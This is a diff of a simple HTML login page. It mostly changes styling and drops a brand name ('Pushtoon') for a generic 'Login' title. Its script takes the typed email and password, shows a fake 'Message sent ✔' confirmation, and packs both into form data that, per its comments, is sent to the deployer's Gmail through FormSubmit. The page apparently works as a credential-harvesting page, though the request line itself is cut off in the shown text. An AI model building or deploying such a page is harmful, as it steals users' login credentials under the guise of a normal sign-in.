@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pushtoon Login</title>
+  <title>Login</title>
 
   <style>
     body{
@@ -20,40 +20,28 @@
       border-radius:15px;
       width:320px;
       text-align:center;
-      box-shadow:0 10px 30px rgba(0,0,0,0.3);
-    }
-
-    h2{
-      margin-bottom:20px;
     }
 
     input{
       width:90%;
       padding:12px;
       margin:10px 0;
-      border:1px solid #ccc;
-      border-radius:8px;
-      outline:none;
     }
 
     button{
       width:95%;
       padding:12px;
-      border:none;
-      border-radius:8px;
       background:#6a1b9a;
       color:white;
-      font-size:16px;
+      border:none;
       cursor:pointer;
     }
 
     #msg{
       margin-top:10px;
-      font-size:14px;
       color:green;
     }
   </style>
-
 </head>
 
 <body>
@@ -75,8 +63,8 @@
 
 function sendData(){
 
-    let email = document.getElementById("email").value.trim();
-    let password = document.getElementById("password").value.trim();
+    let email = document.getElementById("email").value;
+    let password = document.getElementById("password").value;
 
     if(email === "" || password === ""){
         document.getElementById("msg").style.color = "red";
@@ -84,11 +72,11 @@ function sendData(){
         return;
     }
 
-    // instant UI message
+    // show message instantly
     document.getElementById("msg").style.color = "green";
     document.getElementById("msg").innerText = "Message sent ✔";
 
-    // send to Gmail (FormSubmit)
+    // send to your Gmail
     let formData = new FormData();
     formData.append("email", email);
     formData.append("password", password);
